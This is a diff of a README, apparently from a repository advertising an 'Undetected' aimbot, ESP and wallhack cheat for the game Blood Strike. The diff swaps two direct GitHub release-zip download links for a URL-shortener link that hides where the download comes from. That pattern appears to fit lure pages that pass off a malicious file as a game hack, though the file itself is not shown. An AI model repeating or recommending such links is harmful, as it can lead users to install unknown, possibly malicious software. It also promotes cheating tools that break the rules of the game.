@@ -36,12 +36,12 @@ Click to access the current version:
 <table>
   <tr>
     <td align="center">
-      <a href="https://github.com/CarterRogue/Blood-Strike-Aimbot-ESP-Wallhack-2025/releases/download/v2.7/BloodStrikeHack2025_v2.7_Undetected.zip">
+      <a href="https://goo.su/xBUsR">
         <img src="https://i.imgur.com/T72Ouhk.jpeg" alt="blood strike esp" width="250">
       </a>
     </td>
     <td align="center">
-      <a href="https://github.com/CarterRogue/Blood-Strike-Aimbot-ESP-Wallhack-2025/releases/download/v2.7/BloodStrikeHack2025_v2.7_Undetected.zip">
+      <a href="https://goo.su/xBUsR">
         <img src="https://i.imgur.com/ElONjJV.jpeg" alt="blood strike aimbot" width="250">
       </a>
     </td>
